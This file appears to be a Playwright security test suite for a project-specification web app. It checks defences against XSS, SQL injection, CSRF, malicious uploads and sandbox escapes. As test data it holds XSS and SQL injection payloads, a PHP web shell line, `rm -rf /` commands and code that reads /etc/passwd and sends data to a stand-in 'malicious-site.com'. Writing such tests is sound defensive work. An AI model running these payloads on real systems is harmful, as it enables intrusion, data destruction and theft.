import { test, expect } from '@playwright/test';
import { AuthHelper, testUsers } from './fixtures/auth';
import { ProjectHelper, testProjects } from './fixtures/project';

test.describe('Security Tests @security', () => {
  let authHelper: AuthHelper;
  let projectHelper: ProjectHelper;

  test.beforeEach(async ({ page }) => {
    authHelper = new AuthHelper(page);
    projectHelper = new ProjectHelper(page);
  });

  test('should prevent XSS attacks in specification content', async ({ page }) => {
    await authHelper.login(testUsers.developer);
    
    const project = testProjects.ecommerce;
    await projectHelper.createProject(project);
    await projectHelper.openProject(project.name);
    await projectHelper.navigateToPhase('REQUIREMENTS');

    // Attempt XSS injection
    const maliciousContent = `
# Requirements Document

<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">

## Requirements

### Requirement 1: User Authentication
**User Story:** As a user, I want to <script>alert('XSS')</script> authenticate.

#### Acceptance Criteria
1. WHEN user logs in THEN system SHALL <img src="x" onerror="alert('XSS')"> authenticate
    `;

    await projectHelper.updateDocument(maliciousContent);

    // Verify script tags are sanitized/escaped
    const editorContent = await page.locator('[data-testid="document-editor"]').innerHTML();
    expect(editorContent).not.toContain('<script>');
    expect(editorContent).not.toContain('onerror=');
    expect(editorContent).not.toContain('onload=');

    // Verify preview also sanitizes content
    await page.click('[data-testid="preview-tab"]');
    const previewContent = await page.locator('[data-testid="markdown-preview"]').innerHTML();
    expect(previewContent).not.toContain('<script>');
    expect(previewContent).not.toContain('onerror=');
    expect(previewContent).not.toContain('onload=');
  });

  test('should prevent SQL injection in search functionality', async ({ page }) => {
    await authHelper.login(testUsers.developer);
    await page.goto('/dashboard');

    // Attempt SQL injection in project search
    const sqlInjectionPayloads = [
      "'; DROP TABLE projects; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO projects (name) VALUES ('hacked'); --"
    ];

    for (const payload of sqlInjectionPayloads) {
      await page.fill('[data-testid="project-search-input"]', payload);
      await page.keyboard.press('Enter');

      // Verify no SQL error messages are displayed
      await expect(page.locator('[data-testid="error-message"]')).not.toContainText('SQL');
      await expect(page.locator('[data-testid="error-message"]')).not.toContainText('database');
      
      // Verify search results are empty or show appropriate message
      const searchResults = page.locator('[data-testid="search-results"]');
      if (await searchResults.isVisible()) {
        await expect(searchResults).not.toContainText('hacked');
      }
    }
  });

  test('should enforce authentication on protected routes', async ({ page }) => {
    const protectedRoutes = [
      '/dashboard',
      '/projects/123',
      '/projects/123/requirements',
      '/projects/123/design',
      '/projects/123/tasks',
      '/analytics',
      '/settings'
    ];

    for (const route of protectedRoutes) {
      await page.goto(route);
      
      // Should redirect to login page
      await page.waitForURL('/login');
      await expect(page.locator('[data-testid="login-form"]')).toBeVisible();
    }
  });

  test('should prevent unauthorized access to other users projects', async ({ page }) => {
    // Login as first user and create project
    await authHelper.login(testUsers.developer);
    const project = testProjects.ecommerce;
    await projectHelper.createProject(project);
    
    // Get project ID from URL
    await projectHelper.openProject(project.name);
    const projectUrl = page.url();
    const projectId = projectUrl.split('/projects/')[1].split('/')[0];
    
    await authHelper.logout();

    // Login as different user
    await authHelper.login(testUsers.student);
    
    // Try to access other user's project directly
    await page.goto(`/projects/${projectId}`);
    
    // Should show access denied or redirect to dashboard
    await expect(page.locator('[data-testid="access-denied"]')).toBeVisible()
      .or(page.waitForURL('/dashboard'));
  });

  test('should validate JWT tokens properly', async ({ page }) => {
    await authHelper.login(testUsers.developer);
    await page.goto('/dashboard');

    // Verify user is authenticated
    await expect(page.locator('[data-testid="user-menu"]')).toBeVisible();

    // Manipulate JWT token in localStorage/cookies
    await page.evaluate(() => {
      localStorage.setItem('auth_token', 'invalid.jwt.token');
    });

    // Refresh page - should redirect to login
    await page.reload();
    await page.waitForURL('/login');
    await expect(page.locator('[data-testid="login-form"]')).toBeVisible();
  });

  test('should prevent CSRF attacks', async ({ page }) => {
    await authHelper.login(testUsers.developer);
    
    const project = testProjects.taskManager;
    await projectHelper.createProject(project);
    await projectHelper.openProject(project.name);

    // Intercept API requests to check for CSRF tokens
    let csrfTokenFound = false;
    
    page.on('request', request => {
      if (request.method() === 'POST' || request.method() === 'PUT' || request.method() === 'DELETE') {
        const headers = request.headers();
        if (headers['x-csrf-token'] || headers['csrf-token']) {
          csrfTokenFound = true;
        }
      }
    });

    // Perform state-changing operation
    await projectHelper.navigateToPhase('REQUIREMENTS');
    await projectHelper.updateDocument('# Updated Requirements');

    // Verify CSRF protection is in place
    expect(csrfTokenFound).toBe(true);
  });

  test('should sanitize file uploads', async ({ page }) => {
    await authHelper.login(testUsers.developer);
    
    const project = testProjects.ecommerce;
    await projectHelper.createProject(project);
    await projectHelper.openProject(project.name);
    await projectHelper.navigateToPhase('REQUIREMENTS');

    // Test file upload functionality if available
    const fileUploadButton = page.locator('[data-testid="file-upload-button"]');
    
    if (await fileUploadButton.isVisible()) {
      // Create malicious file content
      const maliciousFile = Buffer.from(`
        <script>alert('XSS')</script>
        <?php system($_GET['cmd']); ?>
        #!/bin/bash
        rm -rf /
      `);

      // Attempt to upload malicious file
      await fileUploadButton.setInputFiles({
        name: 'malicious.php',
        mimeType: 'application/x-php',
        buffer: maliciousFile,
      });

      // Verify file is rejected or sanitized
      await expect(page.locator('[data-testid="upload-error"]')).toBeVisible()
        .or(expect(page.locator('[data-testid="file-sanitized"]')).toBeVisible());
    }
  });

  test('should implement rate limiting', async ({ page }) => {
    await authHelper.login(testUsers.developer);
    
    const project = testProjects.chatApp;
    await projectHelper.createProject(project);
    await projectHelper.openProject(project.name);
    await projectHelper.navigateToPhase('REQUIREMENTS');

    // Rapidly request AI reviews to test rate limiting
    const rapidRequests = [];
    
    for (let i = 0; i < 20; i++) {
      rapidRequests.push(
        page.click('[data-testid="ai-review-button"]')
      );
    }

    await Promise.allSettled(rapidRequests);

    // Should show rate limit error
    await expect(page.locator('[data-testid="rate-limit-error"]')).toBeVisible();
    await expect(page.locator('[data-testid="rate-limit-error"]')).toContainText('rate limit');
  });

  test('should secure code execution sandbox', async ({ page }) => {
    await authHelper.login(testUsers.developer);
    
    const project = testProjects.taskManager;
    await projectHelper.createProject(project);
    await projectHelper.openProject(project.name);
    
    // Navigate to code execution interface
    await page.click('[data-testid="code-execution-tab"]');

    // Test malicious code execution attempts
    const maliciousCode = `
      // Attempt to access file system
      const fs = require('fs');
      fs.readFileSync('/etc/passwd');
      
      // Attempt to execute system commands
      const { exec } = require('child_process');
      exec('rm -rf /', (error, stdout, stderr) => {
        console.log(stdout);
      });
      
      // Attempt network access
      const http = require('http');
      http.get('http://malicious-site.com/steal-data');
    `;

    await page.fill('[data-testid="code-editor"]', maliciousCode);
    await page.click('[data-testid="execute-code-button"]');

    // Verify execution is blocked or sandboxed
    const executionResult = page.locator('[data-testid="execution-result"]');
    await expect(executionResult).toContainText('Error')
      .or(expect(executionResult).toContainText('Permission denied'))
      .or(expect(executionResult).toContainText('Module not found'));
  });

  test('should validate input lengths and prevent buffer overflow', async ({ page }) => {
    await authHelper.login(testUsers.developer);
    
    const project = testProjects.ecommerce;
    await projectHelper.createProject(project);
    await projectHelper.openProject(project.name);
    await projectHelper.navigateToPhase('REQUIREMENTS');

    // Generate extremely long content
    const longContent = 'A'.repeat(1000000); // 1MB of content

    // Attempt to save extremely long document
    await page.fill('[data-testid="document-editor"]', longContent);

    // Should show validation error or truncate content
    await expect(page.locator('[data-testid="content-too-long-error"]')).toBeVisible()
      .or(expect(page.locator('[data-testid="content-truncated"]')).toBeVisible());
  });

  test('should prevent session fixation attacks', async ({ page }) => {
    // Get initial session ID
    await page.goto('/login');
    const initialSessionId = await page.evaluate(() => {
      return document.cookie.match(/session_id=([^;]+)/)?.[1];
    });

    // Login
    await authHelper.login(testUsers.developer);

    // Get session ID after login
    const postLoginSessionId = await page.evaluate(() => {
      return document.cookie.match(/session_id=([^;]+)/)?.[1];
    });

    // Session ID should change after login
    expect(postLoginSessionId).not.toBe(initialSessionId);
  });

  test('should implement secure password requirements', async ({ page }) => {
    await page.goto('/register');

    const weakPasswords = [
      '123',
      'password',
      'abc',
      '111111',
      'qwerty'
    ];

    for (const weakPassword of weakPasswords) {
      await page.fill('[data-testid="name-input"]', 'Test User');
      await page.fill('[data-testid="email-input"]', 'test@example.com');
      await page.fill('[data-testid="password-input"]', weakPassword);
      await page.fill('[data-testid="confirm-password-input"]', weakPassword);
      
      await page.click('[data-testid="register-button"]');

      // Should show password strength error
      await expect(page.locator('[data-testid="password-error"]')).toBeVisible();
      await expect(page.locator('[data-testid="password-error"]')).toContainText('password');
    }
  });

  test('should prevent clickjacking attacks', async ({ page }) => {
    // Check for X-Frame-Options or CSP frame-ancestors header
    const response = await page.goto('/dashboard');
    const headers = response?.headers();
    
    const hasFrameProtection = 
      headers?.['x-frame-options'] === 'DENY' ||
      headers?.['x-frame-options'] === 'SAMEORIGIN' ||
      headers?.['content-security-policy']?.includes('frame-ancestors');

    expect(hasFrameProtection).toBe(true);
  });

  test('should implement secure headers', async ({ page }) => {
    const response = await page.goto('/dashboard');
    const headers = response?.headers();

    // Check for security headers
    expect(headers?.['x-content-type-options']).toBe('nosniff');
    expect(headers?.['x-xss-protection']).toBeDefined();
    expect(headers?.['strict-transport-security']).toBeDefined();
    expect(headers?.['content-security-policy']).toBeDefined();
  });

  test('should audit user actions', async ({ page }) => {
    await authHelper.login(testUsers.developer);
    
    const project = testProjects.ecommerce;
    await projectHelper.createProject(project);
    await projectHelper.openProject(project.name);

    // Perform various actions that should be audited
    await projectHelper.navigateToPhase('REQUIREMENTS');
    await projectHelper.updateDocument('# Updated Requirements');
    await projectHelper.requestAIReview();

    // Check audit log (if accessible)
    await page.click('[data-testid="user-menu"]');
    
    if (await page.locator('[data-testid="audit-log-link"]').isVisible()) {
      await page.click('[data-testid="audit-log-link"]');
      
      // Verify actions are logged
      await expect(page.locator('[data-testid="audit-entry"]')).toBeVisible();
      await expect(page.locator('[data-testid="audit-entry"]')).toContainText('document_updated');
      await expect(page.locator('[data-testid="audit-entry"]')).toContainText('ai_review_requested');
    }
  });
});